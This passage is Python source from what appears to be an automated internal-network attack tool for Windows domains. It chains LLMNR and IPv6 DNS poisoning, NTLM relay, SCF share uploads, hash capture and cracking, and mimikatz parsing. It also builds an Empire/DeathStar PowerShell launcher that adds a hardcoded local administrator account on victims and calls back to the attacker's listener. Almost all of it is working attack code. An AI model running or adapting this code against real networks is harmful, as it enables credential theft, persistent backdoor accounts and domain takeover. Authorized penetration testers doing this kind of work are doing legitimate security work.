        hash_split = ntlm_hash.split(':')
        user = hash_split[2]+'\\'+hash_split[0]

        # Don't bother with cracking machine accounts (WIN10$)
        if '$' not in user and user not in prev_creds:
            prev_creds.append(user)
            print_good('Hash found for {}!'.format(user))
            if ntlm_hash.count(':') == 5:
                new_hash = {'NTLMv2':[ntlm_hash]}
            elif ntlm_hash.count(':') == 4:
                new_hash = {'NTLMv1':[ntlm_hash]}

    return prev_creds, new_hash

def cleanup_responder(resp_proc, prev_creds):
    '''
    Kill responder and move the log file
    '''
    resp_proc.kill()
    path = 'submodules/Responder/logs/Responder-Session.log'
    timestamp = str(time.time())
    os.rename(path, path+'-'+timestamp)
    prev_creds = get_cracked_pwds(prev_creds)

    return prev_creds

def cleanup_mitm6(mitm6_proc):
    '''
    SIGINT mitm6
    '''
    arp_file = 'arp.cache'
    if os.path.isfile(arp_file):
        os.remove(arp_file)

    pid = mitm6_proc.pid
    os.kill(pid, signal.SIGINT)
    print_info('Waiting on mitm6 to cleanly shut down...')
    time.sleep(5)

def get_user_from_ntlm_hash(ntlm_hash):
    '''
    Gets the username in form of LAB\\uame from ntlm hash
    '''
    hash_split = ntlm_hash.split(':')
    try:
        user = hash_split[2]+'\\'+hash_split[0]
    except IndexError:
        user = None

    return user

def parse_ntlmrelay_line(line, successful_auth, prev_creds, args):
    '''
    Parses ntlmrelayx.py's output
    '''
    hashes = {}

    # check for errors
    if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
        # First few lines of mimikatz logo start with '   ' and have #### in them
        if '####' not in line and 'mimikatz_initOrClean ; CoInitializeEx' not in line:
            print('    '+line.strip())

    # ntlmrelayx output
    if re.search('\[.\]', line):
        print('    '+line.strip())

    # Only try to crack successful auth hashes
    if successful_auth == True:
        successful_auth = False
        netntlm_hash = line.split()[-1]+'\n'
        user = get_user_from_ntlm_hash(netntlm_hash)
        if user:
            if user not in prev_creds:
                prev_creds.append(user)

                if netntlm_hash.count(':') == 5:
                    hash_type = 'NTLMv2'
                    hashes[hash_type] = [netntlm_hash]

                if netntlm_hash.count(':') == 4:
                    hash_type = 'NTLMv1'
                    hashes[hash_type] = [netntlm_hash]

            if len(hashes) > 0:
                if 'crack' not in args.skip.lower():
                    john_procs = crack_hashes(hashes)

    if successful_auth == False:
        if ' SUCCEED' in line:
            if '$ SUCCEED' not in line:
                successful_auth = True

    if 'Executed specified command on host' in line:
        ip = line.split()[-1]
        host_user_pwd = ip+'\\icebreaker:P@ssword123456'
        prev_creds.append(host_user_pwd)
        duplicate = check_found_passwords(host_user_pwd)
        if duplicate == False:
            print_great('User created! '+host_user_pwd)
            log_pwds([host_user_pwd])

    return prev_creds, successful_auth

def run_ipv6_dns_poison():
    '''Runs mitm6 to poison DNS via IPv6'''
    cmd = 'mitm6'
    mitm6_proc = run_proc(cmd)

    return mitm6_proc

class HTTPHandler(SimpleHTTPRequestHandler):
    '''This handler uses server.base_path instead of always using os.getcwd()'''
    def translate_path(self, path):
        path = SimpleHTTPRequestHandler.translate_path(self, path)
        relpath = os.path.relpath(path, os.getcwd())
        fullpath = os.path.join(self.server.base_path, relpath)
        return fullpath
    def log_message(self, format, *args):
        pass

class HTTPServer(BaseHTTPServer):
    '''The main server, you pass in base_path which is the path you want to serve requests from'''
    def __init__(self, base_path, server_address, RequestHandlerClass=HTTPHandler):
        self.base_path = base_path
        BaseHTTPServer.__init__(self, server_address, RequestHandlerClass)

def start_webserver(port):
    web_dir = os.path.join(os.path.dirname(__file__), 'web')
    handler = http.server.SimpleHTTPRequestHandler
    #httpd = socketserver.TCPServer(("", port), handler)
    httpd = HTTPServer(web_dir, ("", port))
    print_info('Starting web server to host Powershell payloads')
    t = Thread(target = httpd.serve_forever)
    t.daemon = True
    t.start()
    return httpd

def do_ntlmrelay(prev_creds, args, iface):
    '''Continuously monitor and parse ntlmrelay output'''
    mitm6_proc = None

    print()
    print_info('Attack 4: NTLM relay with Responder and ntlmrelayx')

    if not args.command:
        httpd = start_webserver(args.port)

    resp_proc, ntlmrelay_proc = run_relay_attack(iface, args)

    if 'dns' not in args.skip:
        print()
        print_info('Attack 5: IPv6 DNS Poison')
        mitm6_proc = run_ipv6_dns_poison()

    ########## CTRL-C HANDLER ##############################
    def signal_handler(signal, frame):
        '''
        Catch CTRL-C and kill procs
        '''
        print_info('CTRL-C caught, cleaning up and closing')

        # Kill procs
        cleanup_responder(resp_proc, prev_creds)
        ntlmrelay_proc.kill()
        httpd.shutdown()

        # Cleanup hash files
        cleanup_hash_files()

        # Clean up SCF file
        remote_scf_cleanup()

        # Kill mitm6
        if mitm6_proc:
            cleanup_mitm6(mitm6_proc)

        sys.exit()

    signal.signal(signal.SIGINT, signal_handler)
    ########## CTRL-C HANDLER ##############################

    mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
    print_info('ntlmrelayx.py output:')
    ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
    file_lines = follow_file(ntlmrelay_file)

    successful_auth = False
    last_check = time.time()
    for line in file_lines:
        # Parse ntlmrelay output
        prev_creds, successful_auth = parse_ntlmrelay_line(line, successful_auth, prev_creds, args)

        # Parse Invoke-PowerDump output
        prev_creds = parse_invoke_powerdump(prev_creds, line)

        # Parse mimikatz output
        prev_creds, mimi_data = parse_mimikatz(prev_creds, mimi_data, line)

        # Get cracked passwords at 10s intervals
        cur_time = time.time()
        if cur_time - last_check > 5:
            prev_creds = get_cracked_pwds(prev_creds)
            last_check = time.time()

def check_for_nse_scripts(hosts):
    '''
    Checks if both NSE scripts were run
    '''
    sec_run = False
    enum_run = False

    for host in hosts:
        ip = host.address

        # Get SMB signing data
        for script_out in host.scripts_results:
            if script_out['id'] == 'smb-security-mode':
                sec_run = True

            if script_out['id'] == 'smb-enum-shares':
                enum_run = True

    if sec_run == False or enum_run == False:
        return False
    else:
        return True

def run_proc_xterm(cmd):
    '''
    Runs a process in an xterm window that doesn't die with icebreaker.py
    '''
    xterm_cmd = 'nohup xterm -hold -e {}'
    full_cmd = xterm_cmd.format(cmd)
    print_info('Running: {}'.format(full_cmd))
    # Split it only on xterm args, leave system command in 1 string
    cmd_split = full_cmd.split(' ', 4)
    # preexec_fn allows the xterm window to stay alive after closing script
    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE, preexec_fn=os.setpgrp)

    return proc

def run_tmux_procs(empire_cmd, ds_cmd):
    '''
    Runs a process in a tmux session by the name of icebreaker
    '''
    cwd = os.getcwd()
    serv = libtmux.Server()
    sess = serv.find_where({'session_name':'icebreaker'})
    win = sess.attached_window
    pane = win.select_pane(0)
    pane.send_keys('cd {}'.format(cwd))
    pane.send_keys('pipenv shell')
    time.sleep(6)
    pane.send_keys(empire_cmd)
    time.sleep(15)
    pane = win.split_window(attach=False)
    pane.select_pane()
    pane.send_keys('cd {}'.format(cwd))
    pane.send_keys('pipenv shell')
    time.sleep(6)
    pane.send_keys(ds_cmd)
    time.sleep(5)

def get_token(base_url):
    '''
    Get empire API token for further API calls
    '''
    login_opts = {'username':'icebreaker', 'password':'P@ssword123456'}
    r = requests.post(base_url + '/api/admin/login', json=login_opts, verify=False) 
    if r.status_code == 200:
        resp_json = r.json()['token']
        return resp_json

    print(r.json())
    raise

def get_launcher_cmd(base_url, token):
    '''
    Gets the DeathStar listener launcher cmd
    Also adds icebreaker user prior to running Empire launcher cmd
    '''
    stager_opts = {'StagerName':'multi/launcher', 'Listener':'DeathStar'}
    r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=stager_opts, verify=False)

    if r.status_code == 200:
        # resp = {'multi/launcher':{'Output':'powershell.exe -NoP...'}
        launcher_cmd = r.json()['multi/launcher']['Output']
        split_launcher_cmd = launcher_cmd.split()
        ps_args = ' '.join(split_launcher_cmd[:-1]) + ' '
        ps_b64 = split_launcher_cmd[-1]
        decoded_ps_b64 = base64.b64decode(ps_b64).decode('ascii').replace('\0','')
        add_user_cmd = 'net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add;'
        decoded_ps_cmd = add_user_cmd + decoded_ps_b64
        remote_cmd = ps_args + base64.b64encode(decoded_ps_cmd.encode('UTF-16LE')).decode('utf-8')

        return remote_cmd

    print(r.json())
    raise

def run_empire_deathstar(iface, args):
    '''
    Gets the empire launcher command to run on the remote machine
    '''
    base_url = 'https://0.0.0.0:1337'
    user = 'icebreaker'
    passwd = 'P@ssword123456'
    empire_cmd = 'cd {}/submodules/Empire;python2 empire --rest --username {} --password {}'.format(os.getcwd(), user,passwd)
    ds_cmd = 'python {}/submodules/DeathStar/DeathStar.py -u {} -p {} -lip http://{}:8080 -lp 8080'.format(os.getcwd(), user, passwd, get_local_ip(iface))

    if args.auto == 'xterm':
        empire_proc = run_proc_xterm(empire_cmd)
        # Time for Empire to load
        time.sleep(15)
        ds_proc = run_proc_xterm(ds_cmd)
        # Time for DeathStar to start listener
        time.sleep(5)
    elif args.auto == 'tmux':
        run_tmux_procs(empire_cmd, ds_cmd)

    token = get_token(base_url)
    launcher_cmd = get_launcher_cmd(base_url, token)

    return launcher_cmd

def remote_scf_cleanup():
    '''
    Deletes the scf file from the remote shares
    '''
    path = 'logs/shares-with-SCF.txt'
    if os.path.isfile(path):
        with open(path) as f:
            lines = f.readlines()
            for l in lines:
                # Returns '['', '', '10.1.1.0', 'path/to/share\n']
                split_line = l.split('\\', 3)
                ip = split_line[2]
                share_folder = split_line[3].strip()
                action = 'rm'
                scf_filepath = '@local.scf'
                stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)

def cleanup_hash_files():
    '''
    Puts all the hash files of each type into one file
    '''
    resp_hash_folder = os.getcwd()+'/submodules/Responder/logs'
    hash_folder = os.getcwd()+'/hashes'


    for fname in os.listdir(resp_hash_folder):
        if re.search('v(1|2).*\.txt', fname):

            if not os.path.isdir(hash_folder):
                os.mkdir(hash_folder)

            os.rename(resp_hash_folder+'/'+fname, hash_folder+'/'+fname)

def main(report, args):
    '''
    Performs:
        SCF file upload for hash collection
        SMB reverse bruteforce
        Responder LLMNR poisoning
        SMB relay
        IPv6 DNS poisoning
        Hash cracking
    '''
    prev_creds = []
    prev_users = []
    loop = asyncio.get_event_loop()
    passwords = create_passwords(args)

    # Get the interface to use with Responder, also used for local IP lookup
    if args.interface:
        iface = args.interface
    else:
        iface = get_iface()

    # Returns a list of Nmap object hosts
    # So you must use host.address, for example, to get the ip
    hosts, DCs = get_hosts(args, report)

    if len(hosts) > 0:
        nse_scripts_run = check_for_nse_scripts(hosts)

        # If Nmap XML shows that one or both NSE scripts weren't run, do it now
        if nse_scripts_run == False:
            hosts, DCs = run_nse_scripts(args, hosts)

        for h in hosts:
            print_good('SMB open: {}'.format(h.address))
        for dc in DCs:
            print_good('Domain controller found: {}'.format(h.address))

        # ATTACK 1: RID Cycling into reverse bruteforce
        if 'rid' not in args.skip.lower():
            prev_creds, prev_users, domains = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users, DCs)
        loop.close()

        # ATTACK 2: SCF file upload to writeable shares
        smb_hosts_found = parse_nse(hosts, args, iface)
        if smb_hosts_found == False:
            print_bad('No hosts with SMB signing disabled')
            if 'relay' not in args.skip.lower():
                print_bad('SMB Relay Attack 4 will fail to execute commands although it may still capture hashes')

    else:
        print_bad('No hosts with port 445 open. \
                   Skipping all attacks except LLMNR/NBNS/mDNS poison attack with Responder.py')

    # ATTACK 3: LLMNR poisoning
    if 'llmnr' not in args.skip.lower():
        print()
        print_info('Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
        prev_lines = []
        resp_proc = start_responder_llmnr(iface)

        # Give Responder a pause to close
        try:
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit()

        # Check for hashes for set amount of time
        timeout = time.time() + 60 * int(args.time)
        try:
            while time.time() < timeout:
                prev_creds, new_lines = parse_responder_log(args, prev_lines, prev_creds)

                for line in new_lines:
                    prev_lines.append(line)

                time.sleep(0.1)

            prev_creds = cleanup_responder(resp_proc, prev_creds)

        except KeyboardInterrupt:
            print_info('Killing Responder.py and moving on')
            prev_creds = cleanup_responder(resp_proc, prev_creds)
            # Give responder some time to die with dignity
            time.sleep(2)


    # ATTACK 4: NTLM relay
    # ATTACK 5: IPv6 DNS WPAD spoof
    if 'relay' not in args.skip.lower() and len(hosts) > 0:
        do_ntlmrelay(prev_creds, args, iface)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()

    if args.auto == 'tmux':
        print_info('Auto domain admin option selected. Open a new terminal and run this command:')
        print('     sudo tmux new -s icebreaker')
        input(colored('[*] ', 'blue')+'Hit enter to continue')

    report = parse_nmap(args)
    main(report, args)

# Todo
# give it agent detection so it can try using icebreaker user if fail?
